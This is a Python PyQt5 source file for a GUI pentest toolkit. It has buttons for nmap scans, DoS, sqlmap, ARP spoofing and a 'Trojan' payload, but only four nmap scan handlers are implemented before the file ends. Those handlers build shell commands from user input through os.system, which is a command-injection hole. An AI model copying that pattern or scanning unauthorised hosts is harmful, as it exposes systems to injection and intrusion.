#!/usr/bin/env python
# -*- coding: utf-8 -*-
from PyQt5 import QtCore, QtGui, QtWidgets
import sys
import os
import time
from PyQt5.QtGui import *
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
import socket
import sys


class Ui_MainWindow(QMainWindow):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(1600, 730)
        MainWindow.setMaximumSize(1600,730)
        MainWindow.setMinimumSize(1600,730)
        MainWindow.setGeometry(200,200,1600,730)
        MainWindow.setWindowIcon(QtGui.QIcon('images/icon.png')) 
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
########################################---------LABELS--------########################################
        self.label_wallpaper = QtWidgets.QLabel(self.centralwidget)
        self.label_wallpaper.setGeometry(QtCore.QRect(0, 0, 1611, 681))
        self.label_wallpaper.setText("")
        self.label_wallpaper.setPixmap(QtGui.QPixmap("images/wallpaper.jpg"))
        self.label_wallpaper.setObjectName("label_wallpaper")

        self.label_site = QtWidgets.QLabel(self.centralwidget)
        self.label_site.setGeometry(QtCore.QRect(25, 22, 71, 31))
        self.label_site.setObjectName("label_site")
        self.label_site.setStyleSheet("color : white;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_port = QtWidgets.QLabel(self.centralwidget)
        self.label_port.setGeometry(QtCore.QRect(330, 21, 61, 31))
        self.label_port.setObjectName("label_port")
        self.label_port.setStyleSheet("color : white;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_nmap = QtWidgets.QLabel(self.centralwidget)
        self.label_nmap.setGeometry(QtCore.QRect(145, 60, 71, 30))
        self.label_nmap.setObjectName("label_nmap")
        self.label_nmap.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_tools = QtWidgets.QLabel(self.centralwidget)
        self.label_tools.setGeometry(QtCore.QRect(145, 300, 71, 31))
        self.label_tools.setObjectName("label_tools")
        self.label_tools.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_result = QtWidgets.QLabel(self.centralwidget)
        self.label_result.setGeometry(QtCore.QRect(600, 35, 80, 35))
        self.label_result.setObjectName("label_result")
        self.label_result.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")
        
        self.label_local_network_scan = QtWidgets.QLabel(self.centralwidget)
        self.label_local_network_scan.setGeometry(QtCore.QRect(940, 80, 140, 31))
        self.label_local_network_scan.setObjectName("label_local_network_scan")
        self.label_local_network_scan.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_payload = QtWidgets.QLabel(self.centralwidget)
        self.label_payload.setGeometry(QtCore.QRect(950, 300, 100, 31))
        self.label_payload.setObjectName("label_payload")
        self.label_payload.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_localip = QtWidgets.QLabel(self.centralwidget)
        self.label_localip.setGeometry(QtCore.QRect(940, 30, 140, 31))
        self.label_localip.setObjectName("label_localip")
        self.label_localip.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_mac = QtWidgets.QLabel(self.centralwidget)
        self.label_mac.setGeometry(QtCore.QRect(950, 250, 100, 31))
        self.label_mac.setObjectName("label_mac")
        self.label_mac.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.label_arp = QtWidgets.QLabel(self.centralwidget)
        self.label_arp.setGeometry(QtCore.QRect(950, 200, 100, 31))
        self.label_arp.setObjectName("label_arp")
        self.label_arp.setStyleSheet("color : black;""border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")       
########################################---------LABELS--------########################################
########################################---------Line Edits----########################################
        
        self.lineEdit_site = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_site.setGeometry(QtCore.QRect(100, 20, 221, 33))
        self.lineEdit_site.setObjectName("lineEdit_site")
        self.lineEdit_site.setPlaceholderText(" www.example.com ")
        self.lineEdit_site.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.plainTextEdit_result = QtWidgets.QPlainTextEdit(self.centralwidget)
        self.plainTextEdit_result.setGeometry(QtCore.QRect(360, 70, 551, 581))
        self.plainTextEdit_result.setObjectName("plainTextEdit_result")
        self.plainTextEdit_result.setStyleSheet("color:white;""border-radius:15px;""font:bold 14px;""border-style:outset;""border-width:5px;""border-color:red;")
        self.plainTextEdit_result.setPlaceholderText("Results")

        self.lineEdit_port = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_port.setGeometry(QtCore.QRect(395, 20, 100, 33))
        self.lineEdit_port.setObjectName("lineEdit_port")
        self.lineEdit_port.setPlaceholderText(" 22,80,23 ")
        self.lineEdit_port.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")

        self.lineEdit_router = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_router.setGeometry(QtCore.QRect(1090, 30, 131, 33))
        self.lineEdit_router.setObjectName("lineEdit_router")
        self.lineEdit_router.setPlaceholderText("Local Gateway IP ")
        self.lineEdit_router.setStyleSheet("border-radius:10px;""font:bold 14px;""border-style:outset;""border-width:2px;""border-color:blue;")      
########################################---------Line Edits----########################################
########################################---------Buttons-------########################################
        self.pushButton_nmap_1 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_1.setGeometry(QtCore.QRect(30, 90, 96, 35))
        self.pushButton_nmap_1.setObjectName("pushButton_nmap_1")
        self.pushButton_nmap_1.clicked.connect(self.nmap_1)
        self.pushButton_nmap_1.setStyleSheet("color : black;""font:bold;")
    
        self.pushButton_nmap_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_2.setGeometry(QtCore.QRect(130, 90, 96, 35))
        self.pushButton_nmap_2.setObjectName("pushButton_nmap_2")
        self.pushButton_nmap_2.clicked.connect(self.nmap_2)
        self.pushButton_nmap_2.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_3 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_3.setGeometry(QtCore.QRect(230, 90, 96, 35))
        self.pushButton_nmap_3.setObjectName("pushButton_nmap_3")
        self.pushButton_nmap_3.clicked.connect(self.nmap_3)
        self.pushButton_nmap_3.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_4 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_4.setGeometry(QtCore.QRect(30, 130, 96, 35))
        self.pushButton_nmap_4.setObjectName("pushButton_nmap_4")
        self.pushButton_nmap_4.clicked.connect(self.nmap_4)
        self.pushButton_nmap_4.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_5 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_5.setGeometry(QtCore.QRect(130, 130, 96, 35))
        self.pushButton_nmap_5.setObjectName("pushButton_nmap_5")
        self.pushButton_nmap_5.clicked.connect(self.nmap_5)
        self.pushButton_nmap_5.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_6 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_6.setGeometry(QtCore.QRect(230, 130, 96, 35))
        self.pushButton_nmap_6.setObjectName("pushButton_nmap_6")
        self.pushButton_nmap_6.clicked.connect(self.nmap_6)
        self.pushButton_nmap_6.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_7 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_7.setGeometry(QtCore.QRect(30, 170, 96, 35))
        self.pushButton_nmap_7.setObjectName("pushButton_nmap_7")
        self.pushButton_nmap_7.clicked.connect(self.nmap_7)
        self.pushButton_nmap_7.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_8 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_8.setGeometry(QtCore.QRect(130, 170, 96, 35))
        self.pushButton_nmap_8.setObjectName("pushButton_nmap_8")
        self.pushButton_nmap_8.clicked.connect(self.nmap_8)
        self.pushButton_nmap_8.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_9 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_9.setGeometry(QtCore.QRect(230, 170, 96, 35))
        self.pushButton_nmap_9.setObjectName("pushButton_nmap_9")
        self.pushButton_nmap_9.clicked.connect(self.nmap_9)
        self.pushButton_nmap_9.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_10 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_10.setGeometry(QtCore.QRect(30, 210, 96, 35))
        self.pushButton_nmap_10.setObjectName("pushButton_nmap_10")
        self.pushButton_nmap_10.clicked.connect(self.nmap_10)
        self.pushButton_nmap_10.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_11 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_11.setGeometry(QtCore.QRect(130, 210, 96, 35))
        self.pushButton_nmap_11.setObjectName("pushButton_nmap_11")
        self.pushButton_nmap_11.clicked.connect(self.nmap_11)
        self.pushButton_nmap_11.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_12 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_12.setGeometry(QtCore.QRect(230, 210, 96, 35))
        self.pushButton_nmap_12.setObjectName("pushButton_nmap_12")
        self.pushButton_nmap_12.clicked.connect(self.nmap_12)
        self.pushButton_nmap_12.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_13 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_13.setGeometry(QtCore.QRect(30, 250, 96, 35))
        self.pushButton_nmap_13.setObjectName("pushButton_nmap_13")
        self.pushButton_nmap_13.clicked.connect(self.nmap_13)
        self.pushButton_nmap_13.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_14 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_14.setGeometry(QtCore.QRect(130, 250, 96, 35))
        self.pushButton_nmap_14.setObjectName("pushButton_nmap_14")
        self.pushButton_nmap_14.clicked.connect(self.nmap_14)
        self.pushButton_nmap_14.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_15 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_15.setGeometry(QtCore.QRect(230, 250, 96, 35))
        self.pushButton_nmap_15.setObjectName("pushButton_nmap_15")
        self.pushButton_nmap_15.clicked.connect(self.nmap_15)
        self.pushButton_nmap_15.setStyleSheet("color : black;""font:bold;")

        self.pushButton_tools_1 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_1.setGeometry(QtCore.QRect(30, 330, 96, 35))
        self.pushButton_tools_1.setObjectName("pushButton_tools_1")
        self.pushButton_tools_1.clicked.connect(self.firewall_detection)
        self.pushButton_tools_1.setStyleSheet("color : black;""font:bold;")

        self.pushButton_tools_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_2.setGeometry(QtCore.QRect(130, 330, 96, 35))
        self.pushButton_tools_2.setObjectName("pushButton_tools_2")
        self.pushButton_tools_2.clicked.connect(self.dos_attack)
        self.pushButton_tools_2.setStyleSheet("color : black;""font:bold;")

        self.pushButton_tools_3 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_3.setGeometry(QtCore.QRect(230, 330, 96, 35))
        self.pushButton_tools_3.setObjectName("pushButton_tools_3")
        self.pushButton_tools_3.clicked.connect(self.subdomain)
        self.pushButton_tools_3.setStyleSheet("color : black;""font:bold;")

        self.pushButton_tools_4 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_4.setGeometry(QtCore.QRect(30, 370, 96, 35))
        self.pushButton_tools_4.setObjectName("pushButton_tools_4")
        self.pushButton_tools_4.clicked.connect(self.dmitryscan)
        self.pushButton_tools_4.setStyleSheet("color : black;""font:bold;")

        self.pushButton_tools_5 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_5.setGeometry(QtCore.QRect(130, 370, 96, 35))
        self.pushButton_tools_5.setObjectName("pushButton_tools_5")
        self.pushButton_tools_5.clicked.connect(self.dirb)
        self.pushButton_tools_5.setStyleSheet("color : black;""font:bold;")

        self.pushButton_tools_6 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_6.setGeometry(QtCore.QRect(230, 370, 96, 35))
        self.pushButton_tools_6.setObjectName("pushButton_tools_6")
        self.pushButton_tools_6.clicked.connect(self.nikto)
        self.pushButton_tools_6.setStyleSheet("color : black;""font:bold;")

        self.pushButton_tools_7 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_tools_7.setGeometry(QtCore.QRect(30, 410, 96, 35))
        self.pushButton_tools_7.setObjectName("pushButton_tools_7")
        self.pushButton_tools_7.clicked.connect(self.get_web_ip)
        self.pushButton_tools_7.setStyleSheet("color : black;""font:bold;")

        self.pushButton_clear = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_clear.setGeometry(QtCore.QRect(690, 33, 96, 35))
        self.pushButton_clear.setObjectName("pushButton_clear")
        self.pushButton_clear.clicked.connect(self.clear)
        self.pushButton_clear.setStyleSheet("color : black;""font:bold;")

        self.pushButton_netdiscover = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_netdiscover.setGeometry(QtCore.QRect(1090, 80, 131, 35))
        self.pushButton_netdiscover.setObjectName("pushButton_netdiscover")
        self.pushButton_netdiscover.clicked.connect(self.netdiscover)
        self.pushButton_netdiscover.setStyleSheet("color : black;""font:bold;")

        self.pushButton_nmap_scan = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_nmap_scan.setGeometry(QtCore.QRect(1230, 80, 131, 35))
        self.pushButton_nmap_scan.setObjectName("pushButton_nmap_scan")
        self.pushButton_nmap_scan.clicked.connect(self.nmap_network_scanner)
        self.pushButton_nmap_scan.setStyleSheet("color : black;""font:bold;")

        self.pushButton_payload = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_payload.setGeometry(QtCore.QRect(1060, 300, 131, 35))
        self.pushButton_payload.setObjectName("pushButton_payload")
        self.pushButton_payload.clicked.connect(self.payload)
        self.pushButton_payload.setStyleSheet("color : black;""font:bold;")

        self.pushButton_sqlmap = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_sqlmap.setGeometry(QtCore.QRect(130, 410, 96, 35))
        self.pushButton_sqlmap.setObjectName("pushButton_sqlmap")
        self.pushButton_sqlmap.clicked.connect(self.sqlmap)
        self.pushButton_sqlmap.setStyleSheet("color : black;""font:bold;")

        self.pushButton_whois = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_whois.setGeometry(QtCore.QRect(230, 410, 96, 35))
        self.pushButton_whois.setObjectName("pushButton_whois")
        self.pushButton_whois.clicked.connect(self.whois)
        self.pushButton_whois.setStyleSheet("color : black;""font:bold;")

        self.pushButton_Mac_Changer = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_Mac_Changer.setGeometry(QtCore.QRect(1060, 250, 131, 35))
        self.pushButton_Mac_Changer.setObjectName("pushButton_Mac_Changer")
        self.pushButton_Mac_Changer.clicked.connect(self.macc_address_change_main)
        self.pushButton_Mac_Changer.setStyleSheet("color : black;""font:bold;")

        self.pushButton_arp_spoofing = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_arp_spoofing.setGeometry(QtCore.QRect(1060, 200, 131, 35))
        self.pushButton_arp_spoofing.setObjectName("pushButton_arp_spoofing")
        self.pushButton_arp_spoofing.clicked.connect(self.arp_spoofing)
        self.pushButton_arp_spoofing.setStyleSheet("color : black;""font:bold;")
########################################---------Buttons-------########################################
########################################---------Raise---------########################################d
        self.label_wallpaper.raise_()
        self.label_mac.raise_()
        self.pushButton_sqlmap.raise_()
        self.label_localip.raise_()
        self.lineEdit_router.raise_()
        self.pushButton_tools_7.raise_()
        self.lineEdit_site.raise_()
        self.label_port.raise_()
        self.pushButton_arp_spoofing.raise_()
        self.pushButton_Mac_Changer.raise_()
        self.label_site.raise_()
        self.label_arp.raise_()
        self.pushButton_nmap_1.raise_()
        self.pushButton_nmap_2.raise_()
        self.pushButton_nmap_4.raise_()
        self.pushButton_nmap_5.raise_()
        self.pushButton_nmap_7.raise_()
        self.pushButton_nmap_8.raise_()
        self.pushButton_nmap_10.raise_()
        self.pushButton_nmap_11.raise_()
        self.pushButton_nmap_3.raise_()
        self.pushButton_nmap_6.raise_()
        self.pushButton_nmap_9.raise_()
        self.pushButton_nmap_12.raise_()
        self.label_nmap.raise_()
        self.pushButton_nmap_14.raise_()
        self.pushButton_nmap_15.raise_()
        self.pushButton_nmap_13.raise_()
        self.label_tools.raise_()
        self.pushButton_tools_2.raise_()
        self.pushButton_tools_1.raise_()
        self.pushButton_tools_3.raise_()
        self.pushButton_tools_5.raise_()
        self.pushButton_tools_4.raise_()
        self.lineEdit_port.raise_()
        self.pushButton_tools_6.raise_()
        self.plainTextEdit_result.raise_()
        self.label_result.raise_()
        self.pushButton_clear.raise_()
        self.pushButton_whois.raise_()
        self.label_local_network_scan.raise_()
        self.pushButton_netdiscover.raise_()
        self.pushButton_nmap_scan.raise_()
        self.label_payload.raise_()
        self.pushButton_payload.raise_()
########################################---------Raise---------########################################
########################################---------Menubar-------########################################
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setStyleSheet("color : white;""border-radius:10px;""font:bold 17px;""border-style:outset;""border-width:1px;""border-color:red;")
        self.menubar.setGeometry(QtCore.QRect(0, 0, 1599, 31))
        self.menubar.setObjectName("menubar")
        self.menuHelp = QtWidgets.QMenu(self.menubar)
        self.menuHelp.setObjectName("menuHelp")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.actionInformation = QtWidgets.QAction(MainWindow)
        self.actionInformation.triggered.connect(self.Information)
        self.actionInformation.setObjectName("actionInformation")
        self.menuHelp.addAction(self.actionInformation)
        self.menubar.addAction(self.menuHelp.menuAction())
        self.actionfile=self.menubar.addMenu("Developer")
        self.actionfile.addAction("Developer")
        self.actionfile.triggered.connect(self.developer)
        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
########################################---------Menubar-------########################################
########################################---------Functions-----########################################
    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "Riglsable "))
        self.pushButton_nmap_1.setText(_translate("MainWindow", "Stndrt Scan"))
        self.label_localip.setText(_translate("MainWindow", "Local Gateway IP :"))
        self.pushButton_nmap_2.setText(_translate("MainWindow", "SYN Scan"))
        self.pushButton_nmap_3.setText(_translate("MainWindow", "Open Ports"))
        self.label_mac.setText(_translate("MainWindow", "Mac Changer:"))
        self.pushButton_arp_spoofing.setText(_translate("MainWindow", "Arp Spoof"))
        self.pushButton_nmap_4.setText(_translate("MainWindow", "All Port Scan"))
        self.pushButton_nmap_5.setText(_translate("MainWindow", "Version Scan"))
        self.pushButton_nmap_6.setText(_translate("MainWindow", "OS info Scan"))
        self.pushButton_nmap_7.setText(_translate("MainWindow", "Fast Scan  "))
        self.pushButton_nmap_8.setText(_translate("MainWindow", "All Scan"))
        self.pushButton_whois.setText(_translate("MainWindow", "Whois"))
        self.pushButton_Mac_Changer.setText(_translate("MainWindow", "Mac Changer"))
        self.pushButton_nmap_9.setText(_translate("MainWindow", "DNS Parsing"))
        self.pushButton_nmap_10.setText(_translate("MainWindow", "IPV6 Scan"))
        self.pushButton_sqlmap.setText(_translate("MainWindow", "Sqlmap"))
        self.label_arp.setText(_translate("MainWindow", "Arp-Spoofing"))
        self.pushButton_nmap_11.setText(_translate("MainWindow", "Ports Scan"))
        self.pushButton_nmap_12.setText(_translate("MainWindow", "Host Scan"))
        self.pushButton_nmap_13.setText(_translate("MainWindow", "FIN Scan"))
        self.pushButton_nmap_14.setText(_translate("MainWindow", "XMass Tree"))
        self.pushButton_tools_7.setText(_translate("MainWindow", "Get IP"))
        self.pushButton_nmap_15.setText(_translate("MainWindow", "Ping Scan"))
        self.pushButton_tools_1.setText(_translate("MainWindow", "Firewall Scan"))
        self.pushButton_tools_2.setText(_translate("MainWindow", "Dos Attack"))
        self.pushButton_tools_3.setText(_translate("MainWindow", "Subdomains"))
        self.pushButton_tools_4.setText(_translate("MainWindow", "Dmitry Scan"))
        self.pushButton_tools_5.setText(_translate("MainWindow", "Dirb"))
        self.pushButton_tools_6.setText(_translate("MainWindow", "Nikto"))
        self.pushButton_clear.setText(_translate("MainWindow", "Clear"))
        self.pushButton_netdiscover.setText(_translate("MainWindow", "Netdiscover"))
        self.pushButton_nmap_scan.setText(_translate("MainWindow", "Nmap Scan"))
        self.pushButton_payload.setText(_translate("MainWindow", "Trojan"))
        self.label_port.setText(_translate("MainWindow", "Ports:"))
        self.label_site.setText(_translate("MainWindow", "      Site:"))
        self.label_nmap.setText(_translate("MainWindow", "    Nmap"))
        self.label_tools.setText(_translate("MainWindow", "    Tools"))
        self.label_result.setText(_translate("MainWindow", "    Result"))
        self.label_local_network_scan.setText(_translate("MainWindow", "Local Network Scan"))
        self.label_payload.setText(_translate("MainWindow", "     Payload"))
        self.menuHelp.setTitle(_translate("MainWindow", "Help"))
        self.actionInformation.setText(_translate("MainWindow", "Information"))
    def nmap_1(self):
        try:         
            if self.lineEdit_site.text()=="":
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Warning)
                msg2.setText("Please enter the site adress or IP adress!")
                msg2.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap Standart scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Standard scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Standard scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_2(self):
        try:

            if self.lineEdit_site.text()=="":
                msg2 = QMessageBox()
                msg2.setWindowTitle("Information")
                msg2.setBaseSize(300,300)
                msg2.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg2.setIcon(QMessageBox.Warning)
                msg2.setText("Please enter the site adress or IP adress!")
                msg2.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap SYN scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("SYN scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Standard scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -sS {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("SYN Scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_3(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap Open Ports scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("Open ports scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("Open ports scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap --open {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Open ports scan completed successfully")
                    msg1.exec_()
                elif reply==QMessageBox.No:
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Warning")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Critical)
                    msg1.setText("Nmap scan could not be started.")
                    msg1.exec_()
        except:
            msg1 = QMessageBox()
            msg1.setWindowTitle("Warning")
            msg1.setBaseSize(300,300)
            msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
            msg1.setIcon(QMessageBox.Critical)
            msg1.setText("Error,something went wrong.Please Try Again")
            msg1.exec_()
    def nmap_4(self):
        try:
            if self.lineEdit_site.text()=="":
                msg5 = QMessageBox()
                msg5.setWindowTitle("Information")
                msg5.setBaseSize(300,300)
                msg5.setWindowIcon(QtGui.QIcon('images/icon.png'))
                msg5.setIcon(QMessageBox.Warning)
                msg5.setText("Please enter the site adress or IP adress!")
                msg5.exec_()
            else:
                msgbox = QMessageBox(QMessageBox.Question, "Nmap Scan", "Do you approve of doing Nmap All Port scanning?")
                msgbox.addButton(QMessageBox.Yes)
                msgbox.addButton(QMessageBox.No)
                msgbox.setWindowIcon(QtGui.QIcon('images/icon.png'))
                reply = msgbox.exec()
                if reply==QMessageBox.Yes:
                    self.plainTextEdit_result.clear()
                    self.plainTextEdit_result.setStyleSheet("color:white;")
                    self.plainTextEdit_result.insertPlainText("All ports scan is starting,please wait...")
                    msg = QMessageBox()
                    msg.setWindowTitle("Information")
                    msg.setBaseSize(300,300)
                    msg.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg.setIcon(QMessageBox.Information)
                    msg.setText("All ports scan is starting,please wait...")
                    msg.exec_()
                    os.system("nmap -p- {} -oN output.txt".format(self.lineEdit_site.text().lower()))
                    with open("output.txt","r+") as file:
                        info=file.read()
                        self.plainTextEdit_result.clear()
                        self.plainTextEdit_result.insertPlainText(info)
                    msg1 = QMessageBox()
                    msg1.setWindowTitle("Information")
                    msg1.setBaseSize(300,300)
                    msg1.setWindowIcon(QtGui.QIcon('images/icon.png'))
                    msg1.setIcon(QMessageBox.Information)
                    msg1.setText("Scan completed successfully")
                    msg1.exec_()
